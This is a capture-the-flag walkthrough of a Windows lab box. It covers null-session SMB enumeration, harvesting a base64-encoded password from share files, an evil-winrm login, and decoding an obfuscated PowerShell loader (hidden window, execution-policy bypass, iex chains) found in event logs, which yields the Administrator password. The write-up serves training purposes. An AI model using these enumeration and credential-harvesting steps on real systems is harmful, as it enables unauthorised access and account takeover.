#box #event-log #decrypt #CyberChef

Compromised is a box that showcases the importance of not leaving secrets wandering across shares. The enumeration leads us into finding two open share, the first one hiding a few scripts, one of which highlights the presence of an encrypted password, while the other shares lets us access to an user's share called "scripting". By looking in depth inside this share we find another **ps1** file hiding the password encrypted in base64. The nmap scan highlights the presence of the open port 5985, this grants us access through WinRM within `evil-winrm`. Once gained the foothold, we find the presence of a folder `C:\Troubleshooting` that hides a ps1 script that gets the EventLog for the Powershell executable and returns us the list of commands used. Some of those commands executed a base64 payload which, if encrypted, reveals another layer of encryption for a portion of the decrypted code. One of the latest portion revealed is once again encrypted but is first compressed using **gunzip**. Its decryption can be easily achieved by using [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()&input=SDRzSUFBQUFBQUFFQUF2SlNBM09TTTNKOFN6MnpVelBLTWxNTFFySlNNd0xBWXFXNXhlbEtBSUEwN3hrSEI4QUFBQQ&oeol=VT) by adding the `From Base64` option and then the `Gunzip` option right after.

## Nmap

The Nmap scan highlights the presence of a few HTTP services and a SMB service

```bash
# Nmap 7.95 scan initiated Thu May 22 15:47:38 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 192.168.114.152
Nmap scan report for 192.168.110.152
Host is up (0.046s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: 2025-05-22T15:48:31+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2021-06-01T08:00:08
|_Not valid after:  2021-08-30T08:00:08
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-05-22T15:47:56
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 22 15:48:31 2025 -- 1 IP address (1 host up) scanned in 53.30 seconds
```

## SMB

We find out we can list and access a few shares on the SMB service. Listing them highlights the presence of a `Scripts$` and a `Users$` share, which seems to be accessible within a null session.
```bash
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Scripts$        Disk      
	Users$          Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.114.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```bash
smbclient -N //192.168.114.152/Scripts$
smbclient -N //192.168.114.152/Users$
```

### Scripts

The scripts shares containing four **ps1** scripts, we decide to download all of them to check their content with `get $filename`.
Upon opening the ps1 files, we discover `fix-printservers.ps1`, containing some interesting content revealing an user and the presence of a $password variable that should showcase the password passed to the script. As of now, we only know that the user `scripting` is an user of the machine.

## Users

We decide to download, for ease, the content of the Users share to our machine, to perform an easier research within bash. To do so, we have 2 ways

SMB Interactively

```bash
smbclient -N //192.168.114.152/Users$
mask ""
recurse ON
prompt OFF
mget *
```

SMB Oneliner with `-c`

```bash
smbclient -N //192.168.114.152/Users$ -c 'prompt OFF; recurse ON; mget *'
```

## Diving in the share's content

Considering we're looking for a password, more likely for a variable found in a ps1 file, we can potentially look for all the ps1 files recursively inside of the downloaded folder. 

```bash
find ./ -name "*.ps1"
```

Alternatively, we can look for files containing the `$password` text inside of them with an advanced find - grep command
```bash
find ./scripting/ -type f -exec grep -Hni "password" {} \;
```

By doing so, we discover the presence of a `profile.ps1` file containing the following base64 encoded string `RgByAGkAZQBuAGQAcwBEAG8AbgB0AEwAZQB0AEYAcgBpAGUAbgBkAHMAQgBhAHMAZQA2ADQAUABhAHMAcwB3AG8AcgBkAHMA`, if decrypted with 
`echo "RgByAGkAZQBuAGQAcwBEAG8AbgB0AEwAZQB0AEYAcgBpAGUAbgBkAHMAQgBhAHMAZQA2ADQAUABhAHMAcwB3AG8AcgBkAHMA" | base64 -d` we obtain the password `FriendsDontLetFriendsBase64Passwords`.
At this point, we have a foothold as:
`scripting:FriendsDontLetFriendsBase64Passwords`

## WinRM Foothold

Referring to our Nmap scan, we discovered that port 5985 is open, this permits us to authenticate through WinRM with the previously discovered credentials.
We decide to use `evil-winrm` to authenticate
```bash
evil-winrm -i 192.168.114.152 -u scripting -p FriendsDontLetFriendsBase64Passwords
```

Once inside the machine, we reach C:\ and find an `output.txt` file and an unusual `Troubleshooting` folder. The `output.txt` hints at us with some information about the machine's OS version, but doesn't seem to lead us anywhere.
Inside the Troubleshooting folder, instead, we discover the presence of another `ps1` file containing the following script:
```powershell
Get-EventLog -LogName 'Windows Powershell' | Export-CSV C:\Troubleshooting\powershell-logs.csv
```

It factually prints the EventLog of the Log `Windows Powershell` and then generate a CSV file containing that log.
By executing the script `./logs.ps1`, we gain the csv file. We decide then to download the file for ease. With **evil-winrm** it's can be easily done by doing `download powershell-logs.csv`.

## Log Read and Privilege Escalation

We decide to `cat powershell-logs.csv` to first realize how's the content and how's formatted. By scrolling up in the logs file at a given moment we find the following log which feels a Base64 encoded command (suggested also by the flag `-Enc` in front):

```txt
Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.17763.1971
	HostId=6bd9de2f-0046-4868-8733-587f8a1de09f
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABPAHcAbgBlAGQAIAA9ACAAQAAoACkAOwAkAE8AdwBuAGUAZAAgACsAPQAgAHsAJABEAGUAYwBvAGQAZQBkACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEAQQB2AEoAUwBBADMATwBTAE0AMwBKADgAUwB6ADIAegBVAHoAUABLAE0AbABNAEwAUQByAEoAUwBNAHcATABBAFkAcQBXADUAeABlAGwASwBBAEkAQQAwADcAeABrAEgAQgA4AEEAQQBBAEEAPQAiACkAfQA7ACQATwB3AG4AZQBkACAAKwA9ACAAewBbAHMAdAByAGkAbgBnAF0AOgA6AGoAbwBpAG4AKAAnACcALAAgACgAIAAoADgAMwAsADEAMQA2ACwAOQA3ACwAMQAxADQALAAxADEANgAsADQANQAsADgAMwAsADEAMAA4ACwAMQAwADEALAAxADAAMQAsADEAMQAyACwAMwAyACwANAA1ACwAOAAzACwAMQAwADEALAA5ADkALAAxADEAMQAsADEAMQAwACwAMQAwADAALAAxADEANQAsADMAMgAsADUAMwApACAAfAAlAHsAIAAoACAAWwBjAGgAYQByAF0AWwBpAG4AdABdACAAJABfACkAfQApACkAIAB8ACAAJgAgACgAKABnAHYAIAAiACoAbQBkAHIAKgAiACkALgBuAGEAbQBlAFsAMwAsADEAMQAsADIAXQAtAGoAbwBpAG4AJwAnACkAfQA7ACQATwB3AG4AZQBkACAAKwA9ACAAewBpAGYAKAAkAGUAbgB2ADoAYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUAIAAtAGUAcQAgACIAYwBvAG0AcAByAG8AbQBpAHMAZQBkACIAKQAgAHsAZQB4AGkAdAB9AH0AOwAkAE8AdwBuAGUAZAAgACsAPQAgAHsAWwBzAHQAcgBpAG4AZwBdADoAOgBqAG8AaQBuACgAJwAnACwAIAAoACAAKAAxADAANQAsADEAMAAyACwAMwAyACwANAAwACwAMQAxADYALAAxADAAMQAsADEAMQA1ACwAMQAxADYALAA0ADUALAA5ADkALAAxADEAMQAsADEAMQAwACwAMQAxADAALAAxADAAMQAsADkAOQAsADEAMQA2ACwAMQAwADUALAAxADEAMQAsADEAMQAwACwAMwAyACwANQA2ACwANAA2ACwANQA2ACwANAA2ACwANQA2ACwANAA2ACwANQA2ACwAMwAyACwANAA1ACwAOAAxACwAMQAxADcALAAxADAANQAsADEAMAAxACwAMQAxADYALAA0ADEALAAzADIALAAxADIAMwAsADEAMAAxACwAMQAyADAALAAxADAANQAsADEAMQA2ACwAMQAyADUAKQAgAHwAJQB7ACAAKAAgAFsAYwBoAGEAcgBdAFsAaQBuAHQAXQAgACQAXwApAH0AKQApACAAfAAgACYAIAAoACgAZwB2ACAAIgAqAG0AZAByACoAIgApAC4AbgBhAG0AZQBbADMALAAxADEALAAyAF0ALQBqAG8AaQBuACcAJwApAH0AOwAkAE8AdwBuAGUAZAAgACsAPQAgAHsAWwBzAHQAcgBpAG4AZwBdADoAOgBqAG8AaQBuACgAJwAnACwAIAAoACAAKAAxADAANQAsADEAMAAyACwAMwAyACwANAAwACwAMwA2ACwAMQAxADEALAAxADEAOQAsADEAMQAwACwAMQAwADEALAAxADAAMAAsADkAMQAsADUAMAAsADkAMwAsADQANgAsADgANAAsADEAMQAxACwAOAAzACwAMQAxADYALAAxADEANAAsADEAMAA1ACwAMQAxADAALAAxADAAMwAsADQAMAAsADQAMQAsADMAMgAsADQANQAsADEAMQAwACwAMQAwADEALAAzADIALAAzADkALAAxADAANQAsADEAMAAyACwANAAwACwAMwA2ACwAMQAwADEALAAxADEAMAAsADEAMQA4ACwANQA4ACwAOQA5ACwAMQAxADEALAAxADAAOQAsADEAMQAyACwAMQAxADcALAAxADEANgAsADEAMAAxACwAMQAxADQALAAxADEAMAAsADkANwAsADEAMAA5ACwAMQAwADEALAAzADIALAA0ADUALAAxADAAMQAsADEAMQAzACwAMwAyACwAMwA0ACwAOQA5ACwAMQAxADEALAAxADAAOQAsADEAMQAyACwAMQAxADQALAAxADEAMQAsADEAMAA5ACwAMQAwADUALAAxADEANQAsADEAMAAxACwAMQAwADAALAAzADQALAA0ADEALAAzADIALAAxADIAMwAsADEAMAAxACwAMQAyADAALAAxADAANQAsADEAMQA2ACwAMQAyADUALAAzADkALAA0ADEALAAzADIALAAxADIAMwAsADEAMAAxACwAMQAyADAALAAxADAANQAsADEAMQA2ACwAMQAyADUALAAzADIALAA2ADkALAAxADAAOAAsADEAMQA1ACwAMQAwADEALAAzADIALAAxADIAMwAsADMANgAsADEAMAA5ACwAMQAxADUALAAzADIALAA2ADEALAAzADIALAA0ADAALAA3ADgALAAxADAAMQAsADEAMQA5ACwANAA1ACwANwA5ACwAOQA4ACwAMQAwADYALAAxADAAMQAsADkAOQAsADEAMQA2ACwAMwAyACwAOAAzACwAMQAyADEALAAxADEANQAsADEAMQA2ACwAMQAwADEALAAxADAAOQAsADQANgAsADcAMwAsADcAOQAsADQANgAsADcANwAsADEAMAAxACwAMQAwADkALAAxADEAMQAsADEAMQA0ACwAMQAyADEALAA4ADMALAAxADEANgAsADEAMQA0ACwAMQAwADEALAA5ADcALAAxADAAOQAsADQAMAAsADMANgAsADYAOAAsADEAMAAxACwAOQA5ACwAMQAxADEALAAxADAAMAAsADEAMAAxACwAMQAwADAALAA0ADQALAA0ADgALAA0ADQALAAzADYALAA2ADgALAAxADAAMQAsADkAOQAsADEAMQAxACwAMQAwADAALAAxADAAMQAsADEAMAAwACwANAA2ACwANwA2ACwAMQAwADEALAAxADEAMAAsADEAMAAzACwAMQAxADYALAAxADAANAAsADQAMQAsADQAMQAsADEAMgA1ACkAIAB8ACUAewAgACgAIABbAGMAaABhAHIAXQBbAGkAbgB0AF0AIAAkAF8AKQB9ACkAKQAgAHwAIAAmACAAKAAoAGcAdgAgACIAKgBtAGQAcgAqACIAKQAuAG4AYQBtAGUAWwAzACwAMQAxACwAMgBdAC0AagBvAGkAbgAnACcAKQB9ADsAJABPAHcAbgBlAGQAIAArAD0AIAB7AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEsAQQBCAE8AQQBHAFUAQQBkAHcAQQB0AEEARQA4AEEAWQBnAEIAcQBBAEcAVQBBAFkAdwBCADAAQQBDAEEAQQBVAHcAQgA1AEEASABNAEEAZABBAEIAbABBAEcAMABBAEwAZwBCAEoAQQBFADgAQQBMAGcAQgBUAEEASABRAEEAYwBnAEIAbABBAEcARQBBAGIAUQBCAFMAQQBHAFUAQQBZAFEAQgBrAEEARwBVAEEAYwBnAEEAbwBBAEUANABBAFoAUQBCADMAQQBDADAAQQBUAHcAQgBpAEEARwBvAEEAWgBRAEIAagBBAEgAUQBBAEkAQQBCAFQAQQBIAGsAQQBjAHcAQgAwAEEARwBVAEEAYgBRAEEAdQBBAEUAawBBAFQAdwBBAHUAQQBFAE0AQQBiAHcAQgB0AEEASABBAEEAYwBnAEIAbABBAEgATQBBAGMAdwBCAHAAQQBHADgAQQBiAGcAQQB1AEEARQBjAEEAVwBnAEIAcABBAEgAQQBBAFUAdwBCADAAQQBIAEkAQQBaAFEAQgBoAEEARwAwAEEASwBBAEEAawBBAEcAMABBAGMAdwBBAHMAQQBDAEEAQQBXAHcAQgBUAEEASABrAEEAYwB3AEIAMABBAEcAVQBBAGIAUQBBAHUAQQBFAGsAQQBUAHcAQQB1AEEARQBNAEEAYgB3AEIAdABBAEgAQQBBAGMAZwBCAGwAQQBIAE0AQQBjAHcAQgBwAEEARwA4AEEAYgBnAEEAdQBBAEUATQBBAGIAdwBCAHQAQQBIAEEAQQBjAGcAQgBsAEEASABNAEEAYwB3AEIAcABBAEcAOABBAGIAZwBCAE4AQQBHADgAQQBaAEEAQgBsAEEARgAwAEEATwBnAEEANgBBAEUAUQBBAFoAUQBCAGoAQQBHADgAQQBiAFEAQgB3AEEASABJAEEAWgBRAEIAegBBAEgATQBBAEsAUQBBAHAAQQBDAGsAQQBMAGcAQgB5AEEARwBVAEEAWQBRAEIAawBBAEgAUQBBAGIAdwBCAGwAQQBHADQAQQBaAEEAQQBvAEEAQwBrAEEAIgApACkAIAB8ACAAaQBlAHgAfQA7ACQATwB3AG4AZQBkACAAfAAgACUAIAB7ACQAXwB8AGkAZQB4AH0A
	EngineVersion=5.1.17763.1971
	RunspaceId=fb460a1f-c733-45f0-b761-86be45bdc2a4
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","PowerShell","System.String[]","400","6/1/2021 8:00:28 AM","6/1/2021 8:00:28 AM",,,
"600","WIN-KT3PV8C2ESH","System.Byte[]","64","Provider Lifecycle","6","Information","Provider ""Variable"" is Started.
```

We decode it with the usual `echo "$command" | base64 -d`, extrapolating the following content from the string:

```txt
$Owned = @();$Owned += {$Decoded = [System.Convert]::FromBase64String("H4sIAAAAAAAEAAvJSA3OSM3J8Sz2zUzPKMlMLQrJSMwLAYqW5xelKAIA07xkHB8AAAA=")};$Owned += {[string]::join('', ( (83,116,97,114,116,45,83,108,101,101,112,32,45,83,101,99,111,110,100,115,32,53) |%{ ( [char][int] $_)})) | & ((gv "*mdr*").name[3,11,2]-join'')};$Owned += {if($env:computername -eq "compromised") {exit}};$Owned += {[string]::join('', ( (105,102,32,40,116,101,115,116,45,99,111,110,110,101,99,116,105,111,110,32,56,46,56,46,56,46,56,32,45,81,117,105,101,116,41,32,123,101,120,105,116,125) |%{ ( [char][int] $_)})) | & ((gv "*mdr*").name[3,11,2]-join'')};$Owned += {[string]::join('', ( (105,102,32,40,36,111,119,110,101,100,91,50,93,46,84,111,83,116,114,105,110,103,40,41,32,45,110,101,32,39,105,102,40,36,101,110,118,58,99,111,109,112,117,116,101,114,110,97,109,101,32,45,101,113,32,34,99,111,109,112,114,111,109,105,115,101,100,34,41,32,123,101,120,105,116,125,39,41,32,123,101,120,105,116,125,32,69,108,115,101,32,123,36,109,115,32,61,32,40,78,101,119,45,79,98,106,101,99,116,32,83,121,115,116,101,109,46,73,79,46,77,101,109,111,114,121,83,116,114,101,97,109,40,36,68,101,99,111,100,101,100,44,48,44,36,68,101,99,111,100,101,100,46,76,101,110,103,116,104,41,41,125) |%{ ( [char][int] $_)})) | & ((gv "*mdr*").name[3,11,2]-join'')};$Owned += {[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAWgBpAHAAUwB0AHIAZQBhAG0AKAAkAG0AcwAsACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgByAGUAYQBkAHQAbwBlAG4AZAAoACkA")) | iex};$Owned | % {$_|iex}
```

We try to go in order, decoding once again the first Base64 string, but we realize something's off since the output of `echo "H4sIAAAAAAAEAAvJSA3OSM3J8Sz2zUzPKMlMLQrJSMwLAYqW5xelKAIA07xkHB8AAAA=" | base64 -d` is: 

```txt
�
�H���,��L�(�L-
�H�
   ����(Ӽd
```

We opt for messing up with [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()&input=SDRzSUFBQUFBQUFFQUF2SlNBM09TTTNKOFN6MnpVelBLTWxNTFFySlNNd0xBWXFXNXhlbEtBSUEwN3hrSEI4QUFBQQ&oeol=VT) to understand which kind of encoding has been performed.

By putting base64, as we've did, we obtaing the same incomprehensible string, but a 'magic wand' appears next to the output label
![[attachments/compromised-writeup-1.webp]]

By hovering it, it suggests us that using `Gunzip` will produce a string which makes definitely more sense to us, hinting at the fact that before encoding that, this string was zipped as well. 
![[attachments/compromised-writeup-2.webp]]
By clicking on it, it adds the Gunzip in the "Recipe" and produces us a string which definitely feels like a password `TheShellIsMightierThanTheSword!`.
We opt to try it to connect through evil-winrm as `Administrator:TheShellIsMightierThanTheSword!`, succeeding and getting Administrator of the machine.
